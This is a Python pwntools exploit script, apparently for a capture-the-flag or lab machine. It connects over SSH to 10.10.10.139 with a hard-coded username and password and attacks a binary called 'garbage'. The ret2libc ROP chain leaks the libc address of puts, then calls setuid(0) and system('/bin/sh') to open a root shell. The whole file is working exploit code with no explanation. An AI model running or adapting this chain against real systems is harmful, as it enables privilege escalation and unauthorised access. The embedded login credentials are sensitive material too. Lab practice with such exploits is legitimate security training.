#!/usr/bin/python

from pwn import *

pop_rdi = p64(0x040179b)
pop_rsi = p64(0x0401799)
fill = "A"*136

binary = ELF("./garbage")
puts_got = p64(binary.got['puts'])
puts_plt = p64(binary.plt['puts'])

libc = ELF("./libc.so.6")
bin_sh = libc.search("/bin/sh\x00").next()
sys_addr = libc.symbols['system']
clean_exit = libc.symbols['exit']

def leak(proc):
    payload = fill + pop_rdi + puts_got + puts_plt + p64(binary.symbols['main'])
    

    proc.sendline(payload)
    proc.recvuntil(": ")
    print("Sending {} bytes".format(len(payload)))
   
    addr = proc.recvuntil("denied.\n")
    addr = proc.recv(7)
    
    puts_offset = u64(addr.strip().ljust(8,"\x00"))
    libc_base = puts_offset - libc.symbols['puts']

    return libc_base

def exploit(proc,base):

    print("Pop the shell")
    payload = fill + pop_rdi +  p64(0) + p64(base+libc.symbols['setuid'])
    payload += pop_rdi + p64(base+bin_sh) + p64(base+sys_addr)
    payload += pop_rdi + p64(0) + p64(base+clean_exit)
    proc.sendline(payload)

def main():
    s = ssh(host='10.10.10.139',user='margo',password='iamgod$08')
    p = s.process("/usr/bin/garbage")

    libc_addr = leak(p)
    exploit(p,libc_addr)

    p.interactive()
    
if __name__ == '__main__':
    main()

